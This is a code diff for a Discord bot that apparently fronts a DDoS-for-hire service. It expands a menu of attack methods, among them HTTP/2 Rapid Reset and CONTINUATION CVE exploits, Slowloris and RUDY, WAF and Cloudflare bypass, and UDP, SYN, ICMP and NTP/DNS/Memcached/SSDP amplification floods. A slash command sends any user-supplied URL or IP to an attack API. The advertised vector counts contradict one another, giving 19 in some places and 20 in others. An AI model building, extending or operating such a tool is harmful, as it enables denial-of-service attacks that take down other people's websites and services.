@@ -39,34 +39,34 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞",           description: "MAX POWER — 14 vectors (ARES): H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+CACHE+TLS+QUIC+SSL+HTTPBypass...", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞ [NOVEMDECIM]", description: "MAX POWER — 19 vectors (NOVEMDECIM ARES): ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+TLS+QUIC+SSL+Storm+ICMP+DNS+NTP+Mem+SSDP", emoji: "👁️" },
   // ── L7 Application ─────────────────────────────────────────────────────
-  { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",         description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",        emoji: "🟣" },
-  { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",          description: "CVE-2023-44487 — 64-stream RST burst, millions req/s",                emoji: "⚡" },
-  { value: "http2-continuation",  label: "💀 H2 CONTINUATION (CVE-2024)", description: "CVE-2024-27316 — endless CONTINUATION frames, server OOM",           emoji: "💀" },
-  { value: "hpack-bomb",          label: "🧨 HPACK Bomb (RFC 7541)",      description: "Incremental-indexed headers → HPACK table eviction storm — no CVE, no fix", emoji: "🧨" },
-  { value: "h2-settings-storm",   label: "🌊 H2 Settings Storm",          description: "SETTINGS HPACK oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain", emoji: "🌊" },
-  { value: "ws-flood",            label: "🕸️ WebSocket Exhaustion",       description: "Holds thousands of WS conns open — goroutine/thread per conn",        emoji: "🕸️" },
-  { value: "graphql-dos",         label: "🔮 GraphQL Introspection DoS",   description: "Nested queries O(N^15) + alias bombs + batched introspection",        emoji: "🔮" },
-  { value: "cache-poison",        label: "☠️ CDN Cache Poisoning DoS",    description: "Fills CDN cache with unique keys — 100% origin miss rate eviction",   emoji: "☠️" },
-  { value: "slowloris",           label: "🐌 Slowloris",                  description: "25K half-open connections — starves nginx/apache thread pool",         emoji: "🐌" },
-  { value: "conn-flood",          label: "🔗 TLS Connection Flood",        description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion",        emoji: "🔗" },
-  { value: "tls-renego",          label: "🔐 TLS Renegotiation DoS",      description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn",    emoji: "🔐" },
-  { value: "rudy",                label: "🩸 R.U.D.Y (SlowPOST)",         description: "Claims 1GB body, sends 1 byte/5s — holds server threads forever",    emoji: "🩸" },
-  { value: "rudy-v2",             label: "🩸 RUDY v2 — Multipart POST",   description: "multipart/form-data + 70-char boundary — harder to detect than RUDY", emoji: "🩸" },
-  { value: "http-flood",          label: "🌊 HTTP Flood",                  description: "High-volume HTTP GET — overwhelms web server resources",              emoji: "🌊" },
-  { value: "http-bypass",         label: "🛡️ HTTP Bypass",               description: "Chrome-fingerprinted 3-layer: fetch+Chrome headers+slow drain — defeats WAF/CDN bot detection", emoji: "🛡️" },
+  { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
+  { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
+  { value: "http2-continuation",  label: "💀 H2 CONTINUATION (CVE-2024)",    description: "CVE-2024-27316 — endless CONTINUATION frames, nginx/Apache OOM — NO patch for nginx ≤1.25.4", emoji: "💀" },
+  { value: "hpack-bomb",          label: "🧨 HPACK Bomb (RFC 7541)",         description: "Incremental-indexed headers → HPACK table eviction storm — no CVE, no fix",        emoji: "🧨" },
+  { value: "h2-settings-storm",   label: "🌊 H2 Settings Storm",             description: "SETTINGS oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain",         emoji: "🌊" },
+  { value: "http-pipeline",       label: "🚇 HTTP Pipeline Flood",            description: "HTTP/1.1 keep-alive pipelining — 128 reqs per TCP write, no wait, 300K req/s",      emoji: "🚇" },
+  { value: "ws-flood",            label: "🕸️ WebSocket Exhaustion",          description: "Holds thousands of WS conns open — goroutine/thread per conn",                     emoji: "🕸️" },
+  { value: "cache-poison",        label: "☠️ CDN Cache Poisoning DoS",       description: "Fills CDN cache with unique keys — 100% origin miss rate eviction",                emoji: "☠️" },
+  { value: "slowloris",           label: "🐌 Slowloris",                     description: "25K half-open connections — starves nginx/apache thread pool",                     emoji: "🐌" },
+  { value: "conn-flood",          label: "🔗 TLS Connection Flood",           description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion",                     emoji: "🔗" },
+  { value: "tls-renego",          label: "🔐 TLS Renegotiation DoS",         description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn",                 emoji: "🔐" },
+  { value: "rudy-v2",             label: "🩸 RUDY v2 — Multipart SlowPOST", description: "multipart/form-data + 70-char boundary — holds server threads, harder to detect",  emoji: "🩸" },
+  { value: "http-flood",          label: "🌊 HTTP Flood",                     description: "High-volume HTTP GET — overwhelms web server resources directly",                  emoji: "🌊" },
+  { value: "http-bypass",         label: "🛡️ HTTP Bypass",                  description: "Chrome-fingerprinted 3-layer: fetch+Chrome headers+slow drain — defeats WAF/CDN",  emoji: "🛡️" },
   // ── L4 Transport ───────────────────────────────────────────────────────
-  { value: "quic-flood",          label: "⚡ QUIC/HTTP3 Flood (RFC 9000)", description: "QUIC Initial packets — server allocates crypto state per DCID → OOM", emoji: "⚡" },
-  { value: "ssl-death",           label: "💀 SSL Death Record",            description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU",        emoji: "💀" },
-  { value: "udp-flood",           label: "💥 UDP Flood",                  description: "Raw UDP packet flood — saturates L4 bandwidth",                       emoji: "💥" },
-  { value: "udp-bypass",          label: "🔀 UDP Bypass",                 description: "UDP flood with randomized payloads to evade rate limiting",            emoji: "🔀" },
-  { value: "syn-flood",           label: "🔌 SYN Flood",                  description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake",       emoji: "🔌" },
-  { value: "tcp-flood",           label: "📡 TCP Flood",                  description: "Raw TCP packet flood against open ports",                              emoji: "📡" },
-  // ── L3 Amplification ───────────────────────────────────────────────────
-  { value: "ntp-amp",             label: "🕐 NTP Amplification [556x]",   description: "Monlist NTP abuse — 556× amplification factor",                       emoji: "🕐" },
-  { value: "dns-amp",             label: "📛 DNS Amplification [54x]",    description: "Open resolver abuse — 54× amplification factor",                      emoji: "📛" },
-  { value: "mem-amp",             label: "💾 Memcached [51000x]",         description: "Exposed Memcached — up to 51,000× amplification",                     emoji: "💾" },
+  { value: "quic-flood",          label: "⚡ QUIC/HTTP3 Flood (RFC 9000)",   description: "QUIC Initial packets — server allocates crypto state per DCID → OOM",             emoji: "⚡" },
+  { value: "ssl-death",           label: "💀 SSL Death Record",               description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU",                    emoji: "💀" },
+  { value: "udp-flood",           label: "💥 UDP Flood",                     description: "Raw UDP packet flood — saturates L4 bandwidth (setInterval burst engine)",        emoji: "💥" },
+  { value: "syn-flood",           label: "🔌 SYN Flood",                     description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake",                  emoji: "🔌" },
+  { value: "tcp-flood",           label: "📡 TCP Flood",                     description: "Raw TCP packet flood against open ports",                                          emoji: "📡" },
+  // ── L3 Network ─────────────────────────────────────────────────────────
+  { value: "icmp-flood",          label: "🔴 ICMP Flood [3-tier engine]",    description: "Real ICMP: Tier1 raw-socket (CAP_NET_RAW), Tier2 hping3, Tier3 UDP saturation burst (always works)", emoji: "🔴" },
+  { value: "ntp-amp",             label: "🕐 NTP Flood [mode7+mode3]",       description: "Real NTP binary protocol — mode7 monlist (CVE-2013-5211) + mode3 to port 123 direct flood", emoji: "🕐" },
+  { value: "dns-amp",             label: "📛 DNS Water Torture [CDN-bypass]", description: "Floods NS servers with random subdomains — bypasses Cloudflare/CDN entirely, NS servers unprotected", emoji: "📛" },
+  { value: "mem-amp",             label: "💾 Memcached UDP Flood [binary]",  description: "Real Memcached binary protocol UDP — get+stats to port 11211, exposed servers common", emoji: "💾" },
+  { value: "ssdp-amp",            label: "📡 SSDP M-SEARCH Flood [UPnP]",   description: "Real SSDP protocol to port 1900 — rotates ST targets, random CPFN header, UPnP stack exhaustion", emoji: "📡" },
 ];
 
 // ── Duration presets ─────────────────────────────────────────────────────────
@@ -146,7 +146,7 @@ const COMMANDS = [
 
   new SlashCommandBuilder()
     .setName("geass")
-    .setDescription("👁️ Launch Geass Override ∞ — ARES maximum power, 14 simultaneous vectors")
+    .setDescription("👁️ Launch Geass Override ∞ — VIGINTUS ARES maximum power, 20 simultaneous real attack vectors")
     .addStringOption(opt =>
       opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
     )
@@ -532,14 +532,16 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
         .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
         .setDescription(
           `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
-          `👁️ **GEASS OVERRIDE — ARES OMNIVECT** — 13 simultaneous vectors against \`${target}\`\n` +
-          `**ConnFlood → Slowloris → H2RST → H2CONT → HPACK Bomb → WAF Bypass → WS → GQL → RUDY v2 → Cache Poison → TLS Renego → QUIC → SSL Death**`
+          `👁️ **GEASS OVERRIDE ∞ — VIGINTUS ARES** — **20** simultaneous real attack vectors against \`${target}\`\n\n` +
+          `**L7:** ConnFlood → Slowloris → H2RST(CVE-2023) → H2CONT(CVE-2024) → HPACK Bomb → WAF Bypass → WebSocket → RUDY v2 → Cache Poison → H2 Storm → Pipeline(300K/s)\n` +
+          `**L4/TLS:** TLS Renegotiation → QUIC/H3 → SSL Death\n` +
+          `**L3/UDP:** ICMP Flood → DNS Water Torture → NTP Flood → Memcached → SSDP`
         )
         .addFields(
           { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
           { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
           { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
-          { name: "📊 Status",   value: "🔴 **INITIALIZING 13 VECTORS — ARES COMMAND...**", inline: false },
+          { name: "📊 Status",   value: "🔴 **INITIALIZING 20 VECTORS — VIGINTUS ARES COMMAND...**", inline: false },
         )
         .setFooter({ text: AUTHOR })
         .setTimestamp()
@@ -548,7 +550,7 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
 
   try {
     const attack  = await api.startAttack({ target, method: "geass-override", threads, duration, port });
-    console.log(`[GEASS #${attack.id}] 10 Vectors online → ${target}`);
+    console.log(`[GEASS #${attack.id}] 19 Vectors online — NOVEMDECIM ARES → ${target}`);
     const row     = buildAttackButtons(attack.id, true);
     const msg     = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
     const userId  = interaction.user.id;
